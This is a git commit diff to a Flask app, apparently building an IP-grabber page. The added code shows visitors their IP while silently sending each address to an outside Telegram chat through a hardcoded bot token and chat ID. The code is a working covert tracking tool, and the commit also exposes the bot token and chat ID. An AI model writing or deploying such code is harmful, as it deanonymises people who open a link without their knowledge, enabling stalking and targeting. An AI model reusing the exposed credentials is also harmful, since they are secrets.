b62a416d862e01c2d3fef7bf4f04daea03576261
Supa-Specials <163894699+Supa-Specials@users.noreply.github.com>
2025-09-22 13:26:07 +0300

    Add files via upload

--- app.py
+++ app.py
@@ -1,10 +1,26 @@
 from flask import Flask, request
+import requests
 
 app = Flask(__name__)
 
+# 🔧 Настройки Telegram
+BOT_TOKEN = "8467658943:AAHfyHgsfXBH0xY77HQxNiG_uOldskIOHbQ"
+CHAT_ID = "5744958521"
+
+def send_to_telegram(ip):
+    text = f"Новый переход! IP: {ip}"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(url, data={"chat_id": CHAT_ID, "text": text})
+
 @app.route("/")
 def index():
+    # Получаем реальный IP (если есть прокси)
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    # Отправляем в Telegram
+    send_to_telegram(ip)
+
+    # Показываем пользователю
     return f"<h2>Ваш IP: {ip}</h2>"
 
 if __name__ == "__main__":
